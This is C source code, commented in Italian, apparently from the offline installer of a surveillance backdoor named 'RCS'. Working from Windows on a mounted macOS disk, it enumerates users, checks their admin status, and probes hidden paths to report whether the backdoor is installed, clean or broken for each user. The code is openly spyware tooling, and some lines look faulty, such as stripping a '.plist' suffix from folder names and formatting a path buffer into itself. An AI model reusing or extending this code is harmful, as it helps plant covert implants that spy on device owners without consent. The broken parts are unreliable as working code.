#include "stdafx.h"
#include "Functions_Users.h"
#include "Functions_RCS_MAC.h"
#include "commons.h"

BOOL MAC_IsAdmin(users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR group_path[MAX_PATH];
	DWORD i;
	WCHAR *user_name;

	_snwprintf_s(group_path, MAX_PATH, _TRUNCATE, L"%sprivate\\var\\db\\dslocal\\nodes\\Default\\groups\\admin.plist", os_info->drive);

	for (i=1; (user_name=GetValueForKey(group_path, "users", i)); i++) {
		if (!_wcsicmp(user_name, user_info->user_name)) {
			free(user_name);
			return TRUE;
		}
		free(user_name);
	}

	return FALSE;
}

DWORD MAC_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info)
{
	WCHAR backdoor_path[MAX_PATH];
	HANDLE hfile;
	BOOL is_dir=FALSE, is_files=FALSE, is_temp_dir=FALSE, is_temp_files=FALSE;

	// Controlla se ci sono directory e file della backdoor running
	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
	hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		is_dir = TRUE;

		_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s\\%s", backdoor_path, rcs_info->hcore);
		hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		if (hfile != INVALID_HANDLE_VALUE) {
			CloseHandle(hfile);
			is_files = TRUE;
		}
	}

	// Controlla se c'e' la directory e i file temporanei 
	swprintf_s(backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
	hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		is_temp_dir = TRUE;

		swprintf_s(backdoor_path, MAX_PATH, L"%s\\%s", backdoor_path, rcs_info->hcore);
		hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		if (hfile != INVALID_HANDLE_VALUE) {
			CloseHandle(hfile);
			is_temp_files = TRUE;
		}
	}

	// Se e' pulito
	if (!is_dir && !is_temp_dir)
		return RCS_CLEAN;

	// Se e' appena stato installato offline
	if (is_temp_files && !is_dir)
		return RCS_INSTALLED;

	// Se sta runnando bene
	if (is_files && !is_temp_dir)
		return RCS_INSTALLED;

	// Se qualcosa non va
	return RCS_BROKEN;
}

users_struct_t *MAC_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
{
	users_struct_t *list_head = NULL;
	users_struct_t **list_curr = NULL;
	WIN32_FIND_DATA find_data;
	HANDLE hfind;
	WCHAR *user_home;
	WCHAR users_path[MAX_PATH];

	list_curr = &list_head;

	_snwprintf_s(users_path, MAX_PATH, _TRUNCATE, L"%sUsers\\*", os_info->drive);
	hfind = FindFirstFile(users_path, &find_data);
	if (hfind == INVALID_HANDLE_VALUE)
		return NULL;

	// Cicla tutti gli utenti
	do {
		if (find_data.cFileName[0] == L'.' || !(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || !wcsicmp(find_data.cFileName, L"shared"))
			continue;

		user_home = (WCHAR *)calloc(MAX_PATH, sizeof(WCHAR));
		if (!user_home)
			continue;
		_snwprintf_s(user_home, MAX_PATH, _TRUNCATE, L"/Users/%s", find_data.cFileName);

		// Ora possiamo allocare la struttura perchè RCS è installabile
		// su quest'utente
		if ( !(*list_curr = (users_struct_t *)calloc(1, sizeof(users_struct_t))) )  {
			free(user_home);
			continue;
		}

		// Tronca il .plist alla fine del nome
		find_data.cFileName[wcslen(find_data.cFileName)-6] = 0;
		(*list_curr)->user_name = _wcsdup(find_data.cFileName);
		(*list_curr)->full_name = _wcsdup(find_data.cFileName);
		(*list_curr)->desc = NULL;
		(*list_curr)->is_disabled = FALSE;
		(*list_curr)->is_local = TRUE;
		(*list_curr)->is_admin = MAC_IsAdmin(*list_curr, os_info);
		(*list_curr)->user_home = user_home;
		(*list_curr)->rcs_status = MAC_GetUserRCSStatus((*list_curr), rcs_info, os_info);

		// Va al prossimo elemento della lista
		list_curr = &((*list_curr)->next);
	} while (FindNextFile(hfind, &find_data));

	FindClose(hfind);
	return list_head;
}
